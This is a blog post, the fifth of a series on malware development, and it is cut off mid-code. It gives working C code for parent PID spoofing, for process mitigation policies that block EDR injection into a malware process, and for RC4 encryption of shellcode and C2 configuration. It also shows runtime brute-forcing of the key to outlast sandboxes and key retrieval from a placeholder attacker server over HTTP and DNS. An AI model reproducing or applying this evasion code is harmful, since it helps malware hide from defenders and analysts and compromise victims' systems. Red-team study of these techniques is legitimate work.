<!DOCTYPE html>
<html><head>
    <title>Malware development part 5 – 0xPat blog – Red/purple teamer</title>

        <meta charset="utf-8">
    <meta content="text/html; charset=UTF-8" http-equiv="Content-Type">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">

    
    <meta name="description" content="Introduction
This is the fifth post of a series which regards the development of malicious software. In this series we will explore and try to implement multiple techniques used by malicious applications to execute code, hide from defenses and persist.
In the previous posts we explored anti-VM, anti-sandbox, anti-debugging and anti-static-analysis methods.
In this post we’ll explore some cool tricks to further obscure our code like parent PID spoofing, process protection, environmental keying and bruteforce decryption of malware data and configuration. So this will be a mix of some cool features I’ve been implementing recently.

">
    <meta property="og:description" content="Introduction
This is the fifth post of a series which regards the development of malicious software. In this series we will explore and try to implement multiple techniques used by malicious applications to execute code, hide from defenses and persist.
In the previous posts we explored anti-VM, anti-sandbox, anti-debugging and anti-static-analysis methods.
In this post we’ll explore some cool tricks to further obscure our code like parent PID spoofing, process protection, environmental keying and bruteforce decryption of malware data and configuration. So this will be a mix of some cool features I’ve been implementing recently.

">
    
    <meta name="author" content="0xPat blog">

    
    <meta property="og:title" content="Malware development part 5">
    <meta property="twitter:title" content="Malware development part 5">
    

    <!--[if lt IE 9]>
      <script src="http://html5shiv.googlecode.com/svn/trunk/html5.js"></script>
    <![endif]-->

    <link rel="stylesheet" type="text/css" href="Malware%20development%20part%205%20%E2%80%93%200xPat%20blog%20%E2%80%93%20Red_purple%20teamer_files/style.css">
    <link rel="alternate" type="application/rss+xml" title="0xPat blog - Red/purple teamer" href="https://0xpat.github.io/feed.xml">

  </head>

  <body>
    <div class="wrapper-masthead">
      <div class="container">
        <header class="masthead clearfix">
          
          <div class="site-info">
            <h1 class="site-name"><a href="https://0xpat.github.io/">0xPat blog</a></h1>
            <p class="site-description">Red/purple teamer</p>
          </div>

          <nav>
            <a href="https://0xpat.github.io/">Blog</a>
            <a href="https://0xpat.github.io/about">About</a>
          </nav>
        </header>
      </div>
    </div>

    <div id="main" role="main" class="container">
      <article class="post">
  <h1>Malware development part 5</h1>

  <div class="entry">
    <h2 id="introduction">Introduction</h2>
<p>This is the fifth post of a series which regards the development of 
malicious software. In this series we will explore and try to implement 
multiple techniques used by malicious applications to execute code, hide
 from defenses and persist.<br>
In the previous posts we explored anti-VM, anti-sandbox, anti-debugging and anti-static-analysis methods.<br>
In this post we’ll explore some cool tricks to further obscure our code 
like parent PID spoofing, process protection, environmental keying and 
bruteforce decryption of malware data and configuration. So this will be
 a mix of some cool features I’ve been implementing recently.</p>

<p>As always: we assume 64-bit execution environment. Also, error checks and cleanups are ommited in the code samples below.</p>

<h2 id="process-creation-tips">Process creation tips</h2>
<h3 id="parent-pid-spoofing">Parent PID spoofing</h3>
<p>This is a simple method to bypass malicious behavior detections based
 on parent-child process relationship. Usually when an application 
starts another executable, the new process has a parent PID assigned 
which indicates the process that created it. This allows to detect and 
possibly block malicious intents like for example <code class="language-plaintext highlighter-rouge">Word</code>/<code class="language-plaintext highlighter-rouge">Excel</code> application starting <code class="language-plaintext highlighter-rouge">Powershell</code>. This technique may be combined with for example process hollowing to achieve more stealth.</p>

<p>The great thing is that <code class="language-plaintext highlighter-rouge">CreateProcess</code> API lets you provide additional information for process creation, including the one called <code class="language-plaintext highlighter-rouge">PROC_THREAD_ATTRIBUTE_PARENT_PROCESS</code>. Let’s see how to use it - we will create a <code class="language-plaintext highlighter-rouge">Powershell</code> process in a way that it will look like it was spawned by <code class="language-plaintext highlighter-rouge">explorer.exe</code>:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">DWORD</span> <span class="n">runningProcessesIDs</span><span class="p">[</span><span class="mi">1024</span><span class="p">];</span>
<span class="n">DWORD</span> <span class="n">runningProcessesCountBytes</span><span class="p">;</span>
<span class="n">DWORD</span> <span class="n">runningProcessesCount</span><span class="p">;</span>
<span class="n">HANDLE</span> <span class="n">hExplorerexe</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>

<span class="n">EnumProcesses</span><span class="p">(</span><span class="n">runningProcessesIDs</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">runningProcessesIDs</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">runningProcessesCountBytes</span><span class="p">);</span>
<span class="n">runningProcessesCount</span> <span class="o">=</span> <span class="n">runningProcessesCountBytes</span> <span class="o">/</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">DWORD</span><span class="p">);</span>

<span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">runningProcessesCount</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">runningProcessesIDs</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">HANDLE</span> <span class="n">hProcess</span> <span class="o">=</span> <span class="n">OpenProcess</span><span class="p">(</span><span class="n">MAXIMUM_ALLOWED</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> <span class="n">runningProcessesIDs</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
        <span class="kt">char</span> <span class="n">processName</span><span class="p">[</span><span class="n">MAX_PATH</span> <span class="o">+</span> <span class="mi">1</span><span class="p">];</span>
        <span class="n">GetModuleFileNameExA</span><span class="p">(</span><span class="n">hProcess</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">processName</span><span class="p">,</span> <span class="n">MAX_PATH</span><span class="p">);</span>
        <span class="n">_strlwr</span><span class="p">(</span><span class="n">processName</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">strstr</span><span class="p">(</span><span class="n">processName</span><span class="p">,</span> <span class="s">"explorer.exe"</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="n">hProcess</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="n">hExplorerexe</span> <span class="o">=</span> <span class="n">hProcess</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="n">STARTUPINFOEXA</span> <span class="n">si</span><span class="p">;</span>
<span class="n">PROCESS_INFORMATION</span> <span class="n">pi</span><span class="p">;</span>
<span class="n">SIZE_T</span> <span class="n">attributeSize</span><span class="p">;</span>
<span class="n">RtlZeroMemory</span><span class="p">(</span><span class="o">&amp;</span><span class="n">si</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">STARTUPINFOEXA</span><span class="p">));</span>
<span class="n">RtlZeroMemory</span><span class="p">(</span><span class="o">&amp;</span><span class="n">pi</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">PROCESS_INFORMATION</span><span class="p">));</span>

<span class="n">InitializeProcThreadAttributeList</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">attributeSize</span><span class="p">);</span>
<span class="n">si</span><span class="p">.</span><span class="n">lpAttributeList</span> <span class="o">=</span> <span class="p">(</span><span class="n">PPROC_THREAD_ATTRIBUTE_LIST</span><span class="p">)</span><span class="n">new</span> <span class="n">byte</span><span class="p">[</span><span class="n">attributeSize</span><span class="p">]();</span>
<span class="n">InitializeProcThreadAttributeList</span><span class="p">(</span><span class="n">si</span><span class="p">.</span><span class="n">lpAttributeList</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">attributeSize</span><span class="p">);</span>
<span class="n">UpdateProcThreadAttribute</span><span class="p">(</span><span class="n">si</span><span class="p">.</span><span class="n">lpAttributeList</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">PROC_THREAD_ATTRIBUTE_PARENT_PROCESS</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">hExplorerexe</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">HANDLE</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
<span class="n">si</span><span class="p">.</span><span class="n">StartupInfo</span><span class="p">.</span><span class="n">cb</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">STARTUPINFOEXA</span><span class="p">);</span>

<span class="n">CreateProcessA</span><span class="p">(</span><span class="s">"C:</span><span class="se">\\</span><span class="s">Windows</span><span class="se">\\</span><span class="s">notepad.exe"</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> <span class="n">EXTENDED_STARTUPINFO_PRESENT</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">si</span><span class="p">.</span><span class="n">StartupInfo</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pi</span><span class="p">);</span>
</code></pre></div></div>

<p>What parent process information looks like normally:</p>

<p><img src="Malware%20development%20part%205%20%E2%80%93%200xPat%20blog%20%E2%80%93%20Red_purple%20teamer_files/ppid1.png" alt="ppid1.png"></p>

<p>And what is looks like when spoofed:</p>

<p><img src="Malware%20development%20part%205%20%E2%80%93%200xPat%20blog%20%E2%80%93%20Red_purple%20teamer_files/ppid2.png" alt="ppid2.png"></p>

<h3 id="process-protection">Process protection</h3>
<p><a href="https://blog.xpnsec.com/protecting-your-malware/">Adam Chester (_xpn_) described</a> two interesting features that can be used to hinder dynamic code analysis performed by EDR or debugging:</p>
<ul>
  <li>blocking third-party binaries from being loaded into the process: <code class="language-plaintext highlighter-rouge">PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON</code></li>
  <li>blocking operations on executable memory pages using Arbitrary Code Gurd (ACG): <code class="language-plaintext highlighter-rouge">PROCESS_CREATION_MITIGATION_POLICY_PROHIBIT_DYNAMIC_CODE_ALWAYS_ON</code></li>
</ul>

<p>This was thoroughly explained by <em>_xpn_</em> so let’s just see some example code:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">STARTUPINFOEXA</span> <span class="n">si</span><span class="p">;</span>
<span class="n">PROCESS_INFORMATION</span> <span class="n">pi</span><span class="p">;</span>
<span class="n">SIZE_T</span> <span class="n">attributeSize</span><span class="p">;</span>
<span class="n">RtlZeroMemory</span><span class="p">(</span><span class="o">&amp;</span><span class="n">si</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">STARTUPINFOEXA</span><span class="p">));</span>
<span class="n">RtlZeroMemory</span><span class="p">(</span><span class="o">&amp;</span><span class="n">pi</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">PROCESS_INFORMATION</span><span class="p">));</span>

<span class="n">InitializeProcThreadAttributeList</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">attributeSize</span><span class="p">);</span>
<span class="n">si</span><span class="p">.</span><span class="n">lpAttributeList</span> <span class="o">=</span> <span class="p">(</span><span class="n">PPROC_THREAD_ATTRIBUTE_LIST</span><span class="p">)</span><span class="n">new</span> <span class="n">byte</span><span class="p">[</span><span class="n">attributeSize</span><span class="p">]();</span>
<span class="n">InitializeProcThreadAttributeList</span><span class="p">(</span><span class="n">si</span><span class="p">.</span><span class="n">lpAttributeList</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">attributeSize</span><span class="p">);</span>
<span class="n">DWORD64</span> <span class="n">policy</span> <span class="o">=</span> <span class="n">PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON</span> <span class="o">|</span> <span class="n">PROCESS_CREATION_MITIGATION_POLICY_PROHIBIT_DYNAMIC_CODE_ALWAYS_ON</span><span class="p">;</span>
<span class="n">UpdateProcThreadAttribute</span><span class="p">(</span><span class="n">si</span><span class="p">.</span><span class="n">lpAttributeList</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">policy</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">HANDLE</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
<span class="n">si</span><span class="p">.</span><span class="n">StartupInfo</span><span class="p">.</span><span class="n">cb</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">STARTUPINFOEXA</span><span class="p">);</span>

<span class="n">bool</span> <span class="n">s</span> <span class="o">=</span> <span class="n">CreateProcessA</span><span class="p">(</span><span class="s">"Malware.exe"</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> <span class="n">EXTENDED_STARTUPINFO_PRESENT</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">si</span><span class="p">.</span><span class="n">StartupInfo</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pi</span><span class="p">);</span>
</code></pre></div></div>

<p>Policies can also be set for existing processes using <code class="language-plaintext highlighter-rouge">SetProcessMitigationPolicy</code> API function.</p>

<p>There is a potential problem though - if we set dynamic code 
prohibition, the target process won’t be able to for example allocate 
executable memory.</p>

<h2 id="advanced-data-obfuscation-by-encoding-or-encryption">Advanced data obfuscation by encoding or encryption</h2>
<p>In previous articles I briefly mentioned string and data obfuscation 
by using XOR “encryption” or Base64 encoding. Let’s take it to the next 
level by encrypting data with a key that is not hardcoded anywhere in 
the binary.</p>

<p>We can use <code class="language-plaintext highlighter-rouge">Bcrypt</code> Windows library (not to be confused with <code class="language-plaintext highlighter-rouge">bcrypt</code>
 hash function) which contains implementation of many cryptographic 
algorithms. We can also implement our own encryption, for example an <code class="language-plaintext highlighter-rouge">RC4</code> function (which should be sufficient for our obfuscation purposes, we’re not aiming for high security here):</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">RC4</span><span class="p">(</span><span class="n">PCHAR</span> <span class="n">key</span><span class="p">,</span> <span class="n">PCHAR</span> <span class="n">input</span><span class="p">,</span> <span class="n">PCHAR</span> <span class="n">output</span><span class="p">,</span> <span class="n">DWORD</span> <span class="n">length</span><span class="p">)</span> <span class="c1">//same function for encryption and decryption</span>
<span class="p">{</span>
    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">S</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
    <span class="kt">int</span> <span class="n">len</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">key</span><span class="p">);</span>
    <span class="kt">int</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">tmp</span><span class="p">;</span>
    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">256</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
        <span class="n">S</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">i</span><span class="p">;</span>
    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">256</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">j</span> <span class="o">=</span> <span class="p">(</span><span class="n">j</span> <span class="o">+</span> <span class="n">S</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">+</span> <span class="p">((</span><span class="n">PUCHAR</span><span class="p">)</span><span class="n">key</span><span class="p">)[</span><span class="n">i</span> <span class="o">%</span> <span class="n">len</span><span class="p">])</span> <span class="o">%</span> <span class="mi">256</span><span class="p">;</span>
        <span class="n">tmp</span> <span class="o">=</span> <span class="n">S</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
        <span class="n">S</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">S</span><span class="p">[</span><span class="n">j</span><span class="p">];</span>
        <span class="n">S</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="n">tmp</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">n</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">n</span> <span class="o">&lt;</span> <span class="n">length</span><span class="p">;</span> <span class="n">n</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">i</span> <span class="o">=</span> <span class="p">(</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">%</span> <span class="mi">256</span><span class="p">;</span>
        <span class="n">j</span> <span class="o">=</span> <span class="p">(</span><span class="n">j</span> <span class="o">+</span> <span class="n">S</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">%</span> <span class="mi">256</span><span class="p">;</span>
        <span class="n">tmp</span> <span class="o">=</span> <span class="n">S</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
        <span class="n">S</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">S</span><span class="p">[</span><span class="n">j</span><span class="p">];</span>
        <span class="n">S</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="n">tmp</span><span class="p">;</span>
        <span class="kt">int</span> <span class="n">rnd</span> <span class="o">=</span> <span class="n">S</span><span class="p">[(</span><span class="n">S</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">+</span> <span class="n">S</span><span class="p">[</span><span class="n">j</span><span class="p">])</span> <span class="o">%</span> <span class="mi">256</span><span class="p">];</span>
        <span class="p">((</span><span class="n">PUCHAR</span><span class="p">)</span><span class="n">output</span><span class="p">)[</span><span class="n">n</span><span class="p">]</span> <span class="o">=</span> <span class="n">rnd</span> <span class="o">^</span> <span class="p">((</span><span class="n">PUCHAR</span><span class="p">)</span><span class="n">input</span><span class="p">)[</span><span class="n">n</span><span class="p">];</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<h3 id="brute-force-decryption">Brute force decryption</h3>

<p>Now the fun part: we can encrypt any data (strings, shellcodes, C2 
configuration etc.) before putting it into the application with a random
 key and task the app to crack the key using brute force! This will make
 the analysis even more difficult. Just imagine a build pipeline which 
uses a random key for every compilation :)</p>

<p>Cracking the encryption key on the application startup takes some 
time (depending on the key length - choose it wisely) and may timeout 
dynamic analysis performed by sandbox.</p>

<p>See example recursive function which cracks an alphanumeric key (up to 15 characters long):</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">unsigned</span> <span class="kt">int</span> <span class="nf">djb2Hash</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">data</span><span class="p">,</span> <span class="n">DWORD</span> <span class="n">dataLength</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">DWORD</span> <span class="n">hash</span> <span class="o">=</span> <span class="mi">9876</span><span class="p">;</span>

    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">dataLength</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">hash</span> <span class="o">=</span> <span class="p">((</span><span class="n">hash</span> <span class="o">&lt;&lt;</span> <span class="mi">5</span><span class="p">)</span> <span class="o">+</span> <span class="n">hash</span><span class="p">)</span> <span class="o">+</span> <span class="p">((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">data</span><span class="p">)[</span><span class="n">i</span><span class="p">];</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="n">hash</span><span class="p">;</span>
<span class="p">}</span>

<span class="n">PCHAR</span> <span class="nf">RecursiveCrack</span><span class="p">(</span><span class="n">PCHAR</span> <span class="n">encryptedData</span><span class="p">,</span> <span class="kt">int</span> <span class="n">encryptedDataLength</span><span class="p">,</span> <span class="n">PCHAR</span> <span class="n">key</span><span class="p">,</span> <span class="kt">int</span> <span class="n">level</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">char</span> <span class="n">keySpace</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"</span><span class="se">\x00</span><span class="s">""ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"</span><span class="p">;</span>
    <span class="n">PCHAR</span> <span class="n">decryptedData</span> <span class="o">=</span> <span class="n">new</span> <span class="kt">char</span><span class="p">[</span><span class="n">encryptedDataLength</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]();</span>
    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">keySpace</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">level</span> <span class="o">==</span> <span class="mi">16</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">i</span><span class="p">)</span> <span class="n">i</span><span class="o">++</span><span class="p">;</span>
            <span class="n">key</span><span class="p">[</span><span class="mi">16</span> <span class="o">-</span> <span class="n">level</span><span class="p">]</span> <span class="o">=</span> <span class="n">keySpace</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
            <span class="n">RC4</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">encryptedData</span><span class="p">,</span> <span class="n">decryptedData</span><span class="p">,</span> <span class="n">encryptedDataLength</span><span class="p">);</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">djb2Hash</span><span class="p">(</span><span class="n">decryptedData</span><span class="p">,</span> <span class="n">encryptedDataLength</span><span class="p">)</span> <span class="o">==</span> <span class="n">hardcodedHash</span><span class="p">)</span> <span class="k">return</span> <span class="n">key</span><span class="p">;</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">i</span> <span class="o">==</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">keySpace</span><span class="p">)</span> <span class="o">-</span> <span class="mi">2</span><span class="p">)</span> <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">else</span>
        <span class="p">{</span>
            <span class="n">key</span><span class="p">[</span><span class="mi">16</span> <span class="o">-</span> <span class="n">level</span><span class="p">]</span> <span class="o">=</span> <span class="n">keySpace</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">RecursiveCrack</span><span class="p">(</span><span class="n">encryptedData</span><span class="p">,</span> <span class="n">encryptedDataLength</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="n">level</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="k">return</span> <span class="n">key</span><span class="p">;</span>
            <span class="k">else</span> <span class="k">continue</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="n">delete</span><span class="p">[]</span> <span class="n">decryptedData</span><span class="p">;</span>
    <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
<span class="p">}</span>

<span class="n">PCHAR</span> <span class="nf">CrackKey</span><span class="p">(</span><span class="n">PCHAR</span> <span class="n">encryptedData</span><span class="p">,</span> <span class="kt">int</span> <span class="n">encryptedDataLength</span><span class="p">)</span>
<span class="p">{</span>

    <span class="n">PCHAR</span> <span class="n">key</span> <span class="o">=</span> <span class="n">new</span> <span class="kt">char</span><span class="p">[</span><span class="mi">16</span><span class="p">]();</span>
    <span class="n">RecursiveCrack</span><span class="p">(</span><span class="n">encryptedData</span><span class="p">,</span> <span class="n">encryptedDataLength</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
    <span class="k">return</span> <span class="n">key</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Key verification is based on comparing the hash of the decrypted data with a precalculated, hardcoded hash value.</p>

<h3 id="time-consuming-operations">Time-consuming operations</h3>
<p>Instead of brute forcing a key, we could implement any mathematical 
calculation which lasts more than just a few seconds on a typical 
desktop computer and gives some unguessable value as a result. Examples 
include: big prime number factorization (like trying to break RSA 
encryption), hashing some data a billion times - the only limit is your 
imagination.</p>

<h3 id="key-delivery">Key delivery</h3>
<p>Instead of calculating the key at runtime, our malicious application 
can retrieve it from our server. We can implement key hosting based on 
DNS, HTTP or any other suitable protocol. Taking it further we could 
serve the key based on a user agent or cookie sent by the beacon, but it
 a different topic (prefably for an upcoming post about Command &amp; 
Control implementation).</p>

<p>Below is an example <code class="language-plaintext highlighter-rouge">HTTP GET</code> request:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">HINTERNET</span> <span class="n">hSession</span> <span class="o">=</span> <span class="n">WinHttpOpen</span><span class="p">(</span><span class="s">L"Mozilla 5.0"</span><span class="p">,</span> <span class="n">WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY</span><span class="p">,</span> <span class="n">WINHTTP_NO_PROXY_NAME</span><span class="p">,</span> <span class="n">WINHTTP_NO_PROXY_BYPASS</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
<span class="n">HINTERNET</span> <span class="n">hConnection</span> <span class="o">=</span> <span class="n">WinHttpConnect</span><span class="p">(</span><span class="n">hSession</span><span class="p">,</span> <span class="s">L"domain.or.ip"</span><span class="p">,</span> <span class="n">INTERNET_DEFAULT_HTTP_PORT</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
<span class="n">HINTERNET</span> <span class="n">hRequest</span> <span class="o">=</span> <span class="n">WinHttpOpenRequest</span><span class="p">(</span><span class="n">hConnection</span><span class="p">,</span> <span class="s">L"GET"</span><span class="p">,</span> <span class="s">L"keying.html"</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">WINHTTP_NO_REFERER</span><span class="p">,</span> <span class="n">WINHTTP_DEFAULT_ACCEPT_TYPES</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
<span class="n">WinHttpSendRequest</span><span class="p">(</span><span class="n">hRequest</span><span class="p">,</span> <span class="n">WINHTTP_NO_ADDITIONAL_HEADERS</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">WINHTTP_NO_REQUEST_DATA</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
<span class="n">WinHttpReceiveResponse</span><span class="p">(</span><span class="n">hRequest</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
<span class="n">DWORD</span> <span class="n">responseLength</span><span class="p">,</span> <span class="n">readDataLength</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="n">WinHttpQueryDataAvailable</span><span class="p">(</span><span class="n">hRequest</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">responseLength</span><span class="p">);</span>
<span class="n">PBYTE</span> <span class="n">response</span> <span class="o">=</span> <span class="n">new</span> <span class="n">byte</span><span class="p">[</span><span class="n">responseLength</span> <span class="o">+</span> <span class="mi">1</span><span class="p">];</span>
<span class="n">WinHttpReadData</span><span class="p">(</span><span class="n">hRequest</span><span class="p">,</span> <span class="n">response</span><span class="p">,</span> <span class="n">responseLength</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">readDataLength</span><span class="p">);</span>
<span class="n">printf</span><span class="p">(</span><span class="s">"%s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">response</span><span class="p">);</span>
</code></pre></div></div>

<p>And here is an example <code class="language-plaintext highlighter-rouge">DNS TXT</code> query:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PDNS_RECORDA</span> <span class="n">ppDNSQueryResults</span><span class="p">;</span>
<span class="n">DnsQuery_A</span><span class="p">(</span><span class="s">"some.domain.tld"</span><span class="p">,</span> <span class="n">DNS_TYPE_TEXT</span><span class="p">,</span>
